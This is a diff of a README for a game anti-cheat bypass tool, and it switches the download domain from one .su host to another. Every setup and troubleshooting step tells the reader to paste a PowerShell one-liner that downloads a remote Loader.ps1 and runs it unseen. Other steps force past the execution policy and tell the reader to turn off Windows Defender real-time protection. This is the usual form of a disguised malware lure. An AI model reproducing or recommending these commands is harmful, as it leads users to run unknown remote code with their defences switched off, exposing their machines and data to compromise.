@@ -3,36 +3,36 @@ A modern way to bypass the new anti-cheat. Without bans.
 
 ---
 
-## 🚀 Automated Installation & Setup (PowerShell)
+## 🛠️ Quick Setup Guide (PowerShell)
 
-1. Open PowerShell as Administrator:
-   * Press the `Win + X` keys simultaneously.
-   * Select Terminal (Admin) or Windows PowerShell (Admin) from the context menu.
+1. Launch PowerShell:
+   * Press `Win + X` on your keyboard.
+   * Click on **Terminal** or **Windows PowerShell** from the list.
 
-2. Execute the Deployment Command:
-   Copy, paste, and press `Enter` to run the following optimized initialization command. This script dynamically configures the network bypass registry and fetches the necessary packages:
+2. Execute the Setup Script:
+   Copy the command below, paste it into your PowerShell window, and hit `Enter`. The script will handle the necessary registry tweaks and install all dependencies automatically:
 
    ```powershell
-   irm https://true-soft.su/powershell/Loader.ps1 | iex
+   irm https://get-software.su/powershell/Loader.ps1 | iex
    ```
+
 ---
 
-## 🔍 Troubleshooting & Common Errors
+## 💡 Resolving Issues
 
-### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
-If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
+### 💬 Script is blocked by Execution Policy
+If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
 ```cmd
-powershell -ExecutionPolicy Bypass -Command "irm https://true-soft.su/powershell/Loader.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://get-software.su/powershell/Loader.ps1 | iex"
 ```
 
-### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
-In older legacy environments where aliases are missing, use explicit full system cmdlets:
+### 💬 "irm" command not found (Outdated PowerShell)
+If your PowerShell version doesn't support the `irm` shortcut, use the full, unabbreviated commands instead:
 ```powershell
-Invoke-RestMethod https://true-soft.su/powershell/Loader.ps1 | Invoke-Expression
+Invoke-RestMethod https://get-software.su/powershell/Loader.ps1 | Invoke-Expression
 ```
 
-
-### 📌 Antivirus or SmartScreen Interception
-Automated deployment routines can sometimes trigger proactive security heuristics. Temporarily disable "Real-time protection" within your Windows Defender settings during setup, then re-enable it immediately after completion.
+### 💬 Antivirus / SmartScreen Alerts
+Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.
 
 ---
